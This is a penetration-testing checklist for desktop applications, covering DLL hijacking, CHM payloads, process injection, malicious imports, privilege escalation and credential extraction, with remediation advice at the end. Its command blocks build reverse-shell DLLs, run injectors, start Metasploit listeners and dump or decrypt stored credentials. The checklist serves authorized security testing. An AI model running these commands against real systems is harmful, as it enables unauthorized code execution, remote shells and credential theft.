# Desktop Application VAPT Testing Checklist

## Pre-Engagement

- [ ] Obtain written authorization / Rules of Engagement (RoE)
- [ ] Document target application name, version, architecture (x86/x64)
- [ ] Identify technology stack (.NET, Java, C++, Electron, etc.)
- [ ] Set up isolated testing environment (VM/sandbox)
- [ ] Prepare attacker machine with listener (nc/msfconsole)

---

## 1. DLL Hijacking / Sideloading

### Discovery
```
# Use Process Monitor (procmon) to find missing DLLs
1. Launch procmon64.exe
2. Filter: Process Name = target.exe, Result = NAME NOT FOUND, Path ends with .dll
3. Launch the target application
4. Note DLLs searched in app directory before System32
```

```powershell
# Or use the automated finder
.\payloads\rce\dll-hijack\find_missing_dlls.ps1 -TargetExe "C:\path\to\app.exe"
```

### Exploitation
```bash
# Compile calc-pop DLL
x86_64-w64-mingw32-gcc -shared -o VERSION.dll payloads\calc-pop\dll_calc.c

# For reverse shell
x86_64-w64-mingw32-gcc -shared -o VERSION.dll payloads\reverse-shell\dll_revshell.c -lws2_32
```

### Test Steps
1. Identify writable DLL search paths (app directory, PATH entries, per-user locations)
2. Compile payload DLL matching the target DLL name
3. If the app needs real DLL functions: use proxy DLL template (`dll_hijack_template.c`)
4. Place payload DLL in the hijackable path
5. Launch the target application
6. **Expected result**: calc.exe pops or reverse shell connects
7. Document: DLL name, path, whether app continued to function

### Variants to Test
- [ ] Application directory (most common)
- [ ] Current working directory
- [ ] Per-user AppData paths
- [ ] PATH environment variable directories
- [ ] Side-by-side (WinSxS) loading
- [ ] Delayed/on-demand DLL loading (trigger specific features)

---

## 2. CHM (Compiled HTML Help) Exploitation

### Discovery
```
1. Check if app bundles or references .chm help files
2. Find: Help menu, F1 handler, help directory
3. Check if .chm files are loaded from writable locations
4. Check if app opens .chm files from user-provided paths (import, open dialog)
```

### Exploitation
```powershell
# Build the CHM payload
.\payloads\rce\chm\build_chm.ps1 -HtmlFile chm_rce.html -OutputChm help.chm

# Or manually with HTML Help Workshop
hhc.exe project.hhp
```

### Test Steps
1. Locate where the app stores/loads .chm files
2. Compile malicious CHM using `chm_rce.html` + `chm_project.hhp`
3. Replace the legitimate .chm or place in the expected path
4. Trigger help display (F1, Help menu, error dialogs)
5. **Expected result**: calc.exe pops when CHM loads
6. Also test: importing a CHM via file-open dialogs

### Variants to Test
- [ ] Replace existing .chm in app directory
- [ ] .chm in user-writable help path
- [ ] .chm opened via file association
- [ ] .chm embedded in imported archive (.zip)
- [ ] .chm path controlled via registry/config

---

## 3. Process Injection

### Discovery
```
1. Identify target processes running with elevated privileges
2. Check if the app spawns child processes
3. Identify processes with weak access controls
```

```powershell
# List processes and their integrity levels
Get-Process | Select-Object Id, ProcessName, Path | Format-Table -AutoSize

# Check process security
Get-Process -Name "target" | ForEach-Object {
    $_.Id, $_.ProcessName, $_.Path
}
```

### Exploitation
```bash
# Classic CreateRemoteThread injection
x86_64-w64-mingw32-gcc -o inject.exe payloads\rce\process-injection\classic_injection.c
inject.exe <target_pid>

# DLL injection via LoadLibrary
x86_64-w64-mingw32-gcc -o dll_inject.exe payloads\rce\process-injection\dll_injection.c
dll_inject.exe <target_pid> C:\full\path\to\calc.dll

# APC injection
x86_64-w64-mingw32-gcc -o apc_inject.exe payloads\rce\process-injection\apc_injection.c
apc_inject.exe <target_pid>
```

### Test Steps
1. Launch the target application
2. Identify target process PID
3. Compile the injection tool for the correct architecture
4. Run the injector targeting the application's process
5. **Expected result**: calc.exe pops in the context of the target process
6. Document: injection method, required privileges, success/failure

### Variants to Test
- [ ] Classic CreateRemoteThread + shellcode
- [ ] DLL injection via LoadLibrary
- [ ] APC injection (QueueUserAPC)
- [ ] Thread hijacking (SuspendThread + SetThreadContext)
- [ ] Process hollowing (if testing installer/updater)
- [ ] Injection into child processes spawned by the app

---

## 4. File Import Feature Testing

### 4a. Zip Slip (Path Traversal)

```python
# Generate traversal ZIP
python -I payloads\import-feature\zip_slip.py --output traversal.zip --type all
```

**Test Steps:**
1. Create ZIP with path traversal entries
2. Import via the application's import/open feature
3. Check if files were extracted outside the intended directory
4. **Verify**: `dir /s C:\temp\zip_slip_poc.txt`

### 4b. Malicious Project Import (.sln/.csproj)

```python
# Generate malicious solution
python -I payloads\import-feature\sln_payload.py --output mal_project --cmd calc.exe

# Zip it for import
Compress-Archive -Path mal_project\* -DestinationPath import-project.zip
```

**Test Steps:**
1. Generate malicious .sln/.csproj with build events
2. Import via app's "Import Project" or "Open Solution" feature
3. If the app builds/processes the project, pre-build events fire
4. **Expected result**: calc.exe pops during import/build

### 4c. XXE in XML-based Imports

```python
# Generate all XXE payloads
python -I payloads\import-feature\xml_xxe.py --output xxe_payloads/ --type all

# Target specific file
python -I payloads\import-feature\xml_xxe.py --output test.xml --type file-read-basic --target "C:/Windows/win.ini"
```

**Test Steps:**
1. Identify XML-based import formats the app accepts
2. Generate appropriate XXE payload
3. Import the file
4. Check if file contents are reflected in the application
5. For OOB: start listener (`python -m http.server 8080`) and check for callbacks

### 4d. DCL/AutoLISP (CAD Applications)

```python
# Generate all CAD payloads
python -I payloads\import-feature\dcl_payload.py --output cad_payloads/ --type all
```

**Test Steps:**
1. Place `acaddoc.lsp` in the same directory as a .dwg file
2. Open the .dwg file with the target application
3. Check if AutoLISP executed on load
4. Test `.scr` script import
5. Test `.dcl` dialog with paired `.lsp` loader

### 4e. .NET Deserialization

```python
# Generate ysoserial command reference
python -I payloads\import-feature\deserialization\dotnet_deser.py --cmd calc.exe
```

**Test Steps:**
1. Decompile the app with dnSpy/ILSpy
2. Search for BinaryFormatter, Deserialize, TypeNameHandling
3. Identify import formats that trigger deserialization
4. Use ysoserial.net to generate appropriate payload
5. Import the payload file

---

## 5. Reverse Shell Confirmation

### Setup Listener
```bash
# Netcat
nc -lvnp 4444

# Metasploit
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
```

### Generate Payloads
```bash
# DLL reverse shell (edit ATTACKER_IP/PORT in source first)
x86_64-w64-mingw32-gcc -shared -o revshell.dll payloads\reverse-shell\dll_revshell.c -lws2_32

# Or use msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o revshell.dll
```

### Test Steps
1. Start listener on attacker machine
2. Replace calc-pop DLL with reverse shell DLL in whichever attack vector worked
3. Trigger the vulnerability
4. **Expected result**: shell callback on listener
5. Run `whoami`, `hostname`, `ipconfig` to document access level

---

## 6. Insecure Credential Storage (CRITICAL)

> OWASP Thick Client: TC2 — Improper Credential Storage

### Automated Scan
```powershell
.\payloads\insecure-storage\extract_credentials.ps1 -AppPath "C:\path\to\app" -AppName "TargetApp"
```

### Test Steps
1. Run the credential extractor against the app directory
2. Check config files for plaintext passwords and connection strings
3. Check registry (`regedit`) for stored credentials under HKCU/HKLM
4. Check SQLite/local databases for credential tables
5. Check for DPAPI-encrypted blobs (decryptable as same user):
   ```powershell
   .\payloads\insecure-storage\dpapi_decrypt.ps1 -FilePath "cred.dat"
   ```
6. Run `strings.exe` against binaries for hardcoded secrets
7. Check Windows Credential Manager (`cmdkey /list`)

### What to Look For
- [ ] Plaintext passwords in config/ini/xml/json files
- [ ] Plaintext connection strings with embedded passwords
- [ ] Base64-encoded credentials (trivially decodable)
- [ ] DPAPI without additional entropy (any same-user process decrypts)
- [ ] Hardcoded API keys/tokens in binaries
- [ ] Credentials stored in registry values
- [ ] SQLite databases with user tables
- [ ] Encryption keys stored alongside encrypted data

---

## 7. Sensitive Data in Memory (HIGH)

> OWASP Thick Client: TC9 — Sensitive Data in Memory

### Test Steps
```powershell
.\payloads\memory-analysis\dump_process_memory.ps1 -ProcessName "TargetApp" -DumpToFile
```
1. Login to the application with test credentials
2. Dump process memory
3. Search for the credentials you just entered:
   ```
   strings.exe -n 8 TargetApp.dmp | findstr /i "password"
   ```
4. Logout and dump memory again — credentials should be cleared
5. Wait for session timeout and check — sensitive data should be zeroed

### What to Look For
- [ ] Credentials visible in memory after login
- [ ] Credentials persist in memory after logout
- [ ] Encryption keys in plaintext memory
- [ ] Session tokens visible in process memory
- [ ] Sensitive data not zeroed after use (SecureZeroMemory)

---

## 8. Insecure Communication / MitM (CRITICAL)

> OWASP Thick Client: TC7 — Insecure Communication
> See: `payloads\network-mitm\ssl_intercept_setup.md` for full setup

### Test Steps
1. Set up Burp Suite as proxy (see setup guide)
2. Launch the target app through the proxy
3. **If traffic appears in Burp without importing CA cert → NO certificate validation (CRITICAL)**
4. Check for plaintext HTTP traffic
5. Check for unencrypted database connections (Wireshark)
6. Test SSL/TLS version and cipher suites

### What to Look For
- [ ] Any plaintext communication (HTTP, raw TCP, unencrypted SQL)
- [ ] App trusts any certificate (no validation)
- [ ] App trusts self-signed certificates
- [ ] Weak TLS (v1.0/1.1, weak ciphers)
- [ ] Credentials in URL parameters
- [ ] No certificate pinning for sensitive operations
- [ ] Update mechanism over HTTP (CRITICAL — MitM → RCE)

---

## 9. Privilege Escalation (CRITICAL)

> See: `payloads\privilege-escalation\`

### Automated Scan
```powershell
.\payloads\privilege-escalation\service_exploits.ps1 -AppName "TargetApp"
.\payloads\privilege-escalation\weak_permissions.ps1 -AppPath "C:\Program Files\TargetApp"
```

### What to Look For
- [ ] Unquoted service paths
- [ ] Writable service binary / directory (local → SYSTEM)
- [ ] Weak service DACL (reconfigure service binary path)
- [ ] Writable scheduled task binaries running as SYSTEM
- [ ] Auto-update service with insecure update channel
- [ ] Application directory writable by non-admin users
- [ ] Writable config files (settings tampering)
- [ ] Writable plugin/extension directories

---

## 10. Binary Patching / Client-Side Auth Bypass (CRITICAL)

> OWASP Thick Client: TC3/TC5 — Improper Authorization/Authentication
> See: `payloads\binary-patching\binary_analysis.md`

### Test Steps
1. Decompile with dnSpy (.NET) or Ghidra (native)
2. Find authentication / authorization logic
3. Patch to bypass (always return true)
4. Test: can you login without credentials?
5. Test: can you access admin features as regular user?
6. Test: can you bypass license/trial restrictions?

### What to Look For
- [ ] Authentication performed client-side only
- [ ] Authorization/role checks client-side only
- [ ] License validation client-side only
- [ ] No binary integrity verification (code signing)
- [ ] Business logic validation only on client

---

## 11. Electron / CEF Application Attacks (CRITICAL if applicable)

> See: `payloads\electron-cef\electron_attacks.md`

### Test Steps
1. Check if app is Electron/CEF (look for electron.exe, libcef.dll)
2. Extract source: `npx asar extract resources/app.asar ./extracted`
3. Check: nodeIntegration, contextIsolation, sandbox settings
4. If nodeIntegration=true, any XSS = RCE
5. Check preload scripts for overly permissive APIs
6. Test custom protocol handlers for injection
7. Check if DevTools accessible (Ctrl+Shift+I)

---

## 12. COM Hijacking (HIGH)

> MITRE ATT&CK: T1546.015
> See: `payloads\com-hijack\`

### Test Steps
```powershell
.\payloads\com-hijack\find_com_targets.ps1 -ProcessName "TargetApp"
```
1. Use procmon to find COM CLSIDs loaded by the app
2. Check if HKCU override is possible (no HKCU entry exists)
3. Register malicious DLL under HKCU for the CLSID
4. Restart the application — payload should execute

---

## 13. CSV / DDE Formula Injection (HIGH)

> See: `payloads\import-feature\csv_dde_injection.py`

### Test Steps
1. Inject DDE payloads into input fields (name, email, notes)
2. Trigger CSV/XLSX export from the application
3. Open exported file in Excel
4. If DDE prompt appears → vulnerability confirmed
5. Also test: import a crafted CSV and check if formulas execute in app grid

---

## 14. Post-Exploitation Checks (Document for Report)

- [ ] What user context did the code execute in? (`whoami /all`)
- [ ] Was it elevated/admin? (`whoami /groups | findstr S-1-16-12288`)
- [ ] What network access does the process have?
- [ ] Can the vulnerability persist across reboots?
- [ ] Does the app have auto-update that could be hijacked?
- [ ] Are there other apps on the system with the same vulnerability?

---

## 15. Evidence Collection

For each finding, document:
1. **Vulnerability**: Name and type (e.g., DLL Hijack — VERSION.dll)
2. **CVSS Score**: Calculate base score
3. **Steps to Reproduce**: Exact commands and paths
4. **Impact**: What an attacker can achieve
5. **Screenshots/Logs**: Calc pop, shell output, procmon traces
6. **Recommendation**: Specific fix (e.g., use SafeDllSearchMode, validate ZIP paths)

---

## Quick Reference — Common Fixes to Recommend

| Vulnerability | Recommendation |
|---------------|----------------|
| DLL Hijack | Use `SetDllDirectory("")`, load from absolute paths, sign DLLs |
| CHM RCE | Don't load CHM from writable paths, validate CHM sources |
| Process Injection | Use PPL (Protected Process Light), reduce token privileges |
| Zip Slip | Validate extracted paths, reject `..` components |
| XXE | Disable DTDs and external entities in XML parser |
| Deserialization | Avoid BinaryFormatter, use allowlist-based serialization |
| Import RCE | Sandbox imported files, don't auto-execute build events |
